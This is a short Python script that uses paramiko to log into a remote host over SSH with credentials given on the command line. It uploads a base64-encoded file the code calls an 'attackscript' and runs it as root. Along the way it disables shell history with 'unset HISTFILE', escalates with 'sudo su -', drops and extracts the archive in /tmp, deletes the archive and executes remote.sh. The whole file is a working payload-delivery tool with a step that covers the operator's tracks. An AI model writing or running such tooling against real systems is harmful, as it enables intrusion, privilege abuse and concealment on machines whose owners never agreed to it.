#!/usr/bin/python

import paramiko
import sys
import base64
import time

try:
    client = paramiko.SSHClient()
except:
    print ("Error making client")

try:
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
except:
    print ("error setting policy")

try:
    client.connect(hostname=sys.argv[1], username=sys.argv[2], password=sys.argv[3])
except:
    print ("Error in connection")

#Not sure if I'll need Channel.get_pty or not
#Set ENV Vars Here so they're not in script?
envset = {}
envset['test'] = "abc"
ssh_stdin=""
ssh_stdout=""
ssh_stderr=""
#try:
chan = client.get_transport().open_session()

attackscripthandle = open (sys.argv[5],"rb")
attackscript = attackscripthandle.read()

#attackscriptbytes = attackscript.encode("ascii")
attackscriptbytes = attackscript

b64_bytes = base64.b64encode(attackscriptbytes)
a64blob = b64_bytes.decode("ascii")

ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command('/bin/bash')
ssh_stdin.write('unset HISTFILE\n')
ssh_stdin.write('/usr/bin/sudo su -\n')
time.sleep(1)
ssh_stdin.write(sys.argv[4]+'\n')
ssh_stdin.write('echo '+a64blob+'| base64 -d > /tmp/remote.tgz\n')
ssh_stdin.write('cd /tmp\n')
ssh_stdin.write('tar zxf /tmp/remote.tgz\n')
ssh_stdin.write('rm /tmp/remote.tgz\n')
ssh_stdin.write('cd remote\n')
ssh_stdin.write('chmod u+x remote.sh\n')
ssh_stdin.write('./remote.sh\n')
ssh_stdin.write('cd ..\n')
#ssh_stdin.write('rm -fr remote\n')

#output = ssh_stdout.readlines()
#for l in output:
#    print (l[:-1]),

#except:
#        print("Error in exec_command")

#output = stdout.readlines()
#print(output)

try:
    client.close()
except:
    print("Error closing connection")

del ssh_stdin, ssh_stdout, ssh_stderr
